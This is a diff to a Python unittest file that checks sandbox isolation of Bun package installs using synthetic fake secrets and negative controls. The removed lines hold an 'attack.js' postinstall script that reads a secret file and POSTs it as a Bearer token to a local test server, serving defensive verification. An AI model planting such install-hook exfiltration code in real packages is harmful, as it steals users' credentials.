@@ -10,6 +10,56 @@ import unittest
 
 
 class CausalFixture(unittest.TestCase):
+    def test_real_offline_bun_install_runs_postinstall_and_benign_javascript(self):
+        spec = importlib.util.spec_from_file_location("fixture", Path(__file__).with_name("isolation-fixture.py"))
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        with tempfile.TemporaryDirectory() as temporary:
+            root = Path(temporary)
+            work = root / "work"
+            work.mkdir()
+            secret = root / "fake-material"
+            secret.write_text("BOSS_SYNTHETIC_FIXTURE:" + secrets.token_hex(24))
+            effect = work / "fake-effect"
+            marker = work / "lifecycle-observed.json"
+            module.write_bun_lifecycle_fixture(work)
+            env = {"PATH":"/usr/local/bin:/usr/bin:/bin", "HOME":str(root),
+                   "TMPDIR":str(root), "FAKE_PATH":str(secret), "FAKE_EFFECT":str(effect)}
+            argv = ["/usr/local/bin/bun", "install", "--offline"]
+            def record(name, result):
+                print(f"synthetic-bun {name}: exit={result.returncode}", flush=True)
+                print("stdout begin\n" + result.stdout.decode() + "stdout end", flush=True)
+                print("stderr begin\n" + result.stderr.decode() + "stderr end", flush=True)
+                if marker.exists():
+                    print("marker " + marker.read_text(), flush=True)
+            installed = module.candidate(argv, env, work)
+            record("exposed-fake-material", installed)
+            self.assertEqual(installed.returncode, 0, installed.stderr)
+            self.assertEqual(json.loads(marker.read_text()), {"lifecycle":True, "javascript":42, "read":True, "effect":True})
+            self.assertEqual(effect.read_bytes(), secret.read_bytes())
+            # Same real install with absent fake material still executes benign
+            # JS and its hook. This is a synthetic control, not Pod separation.
+            marker.unlink()
+            effect.unlink()
+            secret.unlink()
+            denied = module.candidate(argv, env, work)
+            record("absent-fake-material", denied)
+            self.assertEqual(denied.returncode, 0, denied.stderr)
+            self.assertEqual(json.loads(marker.read_text()), {"lifecycle":True, "javascript":42, "read":False, "effect":False})
+            self.assertFalse(effect.exists())
+            marker.unlink()
+            # A successful install that suppresses hooks cannot provide evidence.
+            suppressed = module.candidate(argv + ["--ignore-scripts"], env, work)
+            record("suppressed-hook-negative-control", suppressed)
+            self.assertEqual(suppressed.returncode, 0, suppressed.stderr)
+            self.assertFalse(marker.exists())
+            secret.write_text("not synthetic material")
+            refused = module.candidate(argv, env, work)
+            record("nonfake-material-refusal", refused)
+            self.assertNotEqual(refused.returncode, 0)
+            self.assertFalse(marker.exists())
+            self.assertFalse(effect.exists())
+
     def test_actual_shell_can_read_and_use_fake_material_only_in_control(self):
         if os.getuid() != 0:
             self.skipTest("local synthetic chroot control requires existing root/CAP_SYS_CHROOT; deployed proof remains owed")
@@ -36,22 +86,11 @@ class CausalFixture(unittest.TestCase):
                 secret = root / "fake-control-secret"
                 secret.write_text(fake)
                 secret.chmod(0o644)  # UID alone cannot explain the refusal.
-                script = """const fs = require('fs');
-let material = 'absent'; let read = false;
-try { material = fs.readFileSync(process.env.FAKE_PATH, 'utf8'); read = true; } catch {}
-const response = await fetch(process.env.FAKE_URL, {method:'POST', headers:{Authorization:'Bearer '+material, 'X-Boss-User':'agent-codex'}});
-console.log(JSON.stringify({read, status:response.status}));
-"""
                 jail = root / "jail"
                 jail.mkdir(mode=0o755)
                 work = jail / "work"
                 work.mkdir(mode=0o777)
                 work.chmod(0o777)
-                (work / "attack.js").write_text(script)
-                (work / "package.json").write_text(json.dumps({"name":"causal-fixture", "scripts":{"postinstall":"bun attack.js"}, "trustedDependencies":["causal-fixture"]}))
-                (work / "attack.js").chmod(0o644)
-                (work / "package.json").chmod(0o644)
-                module.copy_tool(jail, "/usr/local/bin/bun")
                 module.copy_tool(jail, "/bin/bash")
                 module.copy_tool(jail, "/usr/bin/curl")
                 env = {"PATH":"/usr/local/bin:/bin", "HOME":"/work", "TMPDIR":"/work", "FAKE_PATH":str(secret), "FAKE_URL":"http://127.0.0.1:" + str(server.server_port)}
